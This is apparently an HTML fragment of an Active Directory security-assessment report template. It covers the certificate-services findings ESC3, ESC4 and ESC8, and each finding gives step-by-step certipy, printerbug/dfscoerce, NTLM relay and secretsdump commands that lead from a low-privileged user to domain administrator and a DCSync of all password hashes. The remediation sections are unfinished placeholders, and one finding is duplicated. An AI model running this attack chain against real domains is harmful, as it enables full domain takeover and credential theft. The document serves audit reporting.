                                                    <p>The low-privileged user can this obtained certificate to request a certificate in another template that allows authentication (ESC3-template) on behalf of a domain adminstator.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-template -on-behalf-of 'test\Administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-2.png"
                                                        alt="Exploiting ESC3">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC3 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="ESC4"><u>ESC4</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template allowing impersonation of a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>ESC4-template</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>CN=ESC4-template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local</td></tr>
                        <tr><td class="grey">Owner</td><td>TEST\Domain Users</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. TEST\Domain Users has Owner rights over ESC4-template, giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify ESC4-template to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p>                                             <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png"
                                                        alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it to be vulnerable to ESC1 technique by using the unsafe permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p 'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit ESC1, enroll in the modified certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on it</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="ESC4"><u>ESC4</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template allowing impersonation of a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>ESC4ACL-template</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>CN=ESC4ACL-template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local</td></tr>
                        <tr><td class="grey">IdentityReference</td><td>NT AUTHORITY\Authenticated Users</td></tr>
                        <tr><td class="grey">ActiveDirectoryRights</td><td>GenericAll</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. NT AUTHORITY\Authenticated Users has GenericAll over CN=ESC4ACL-template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local, giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify ESC4ACL-template to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p>                                             <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png"
                                                        alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it to be vulnerable to ESC1 technique by using the unsafe permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p 'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit ESC1, enroll in the modified certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on it</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="ESC8"><u>ESC8</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>test-CA-CA</td></tr>
                                            <tr><td class="grey">CA Endpoint</td><td>http://CA.test.local/certsrv/</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface (http://CA.test.local/certsrv/) is vulnerable to 'NTLM relay' attacks.
                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication (i.e. of a domain controller) to any low privileged user.</p>
                                            <p>This allows a low-privileged user to escalate to a domain controller and extract all user passwords from the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
                                                        alt="Finding ESC8">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
                                                        192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                        DomainController</p>
                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Relaying authentication to ADCS web endpoint">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Enforce HTTPS & EPA, disable Kerberos or disable the endpoint</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr></tbody></table></div>
    <div class="finding-header">Kerberos</div>
    <h2 class="novuln">No vulnerabilities found!</h2>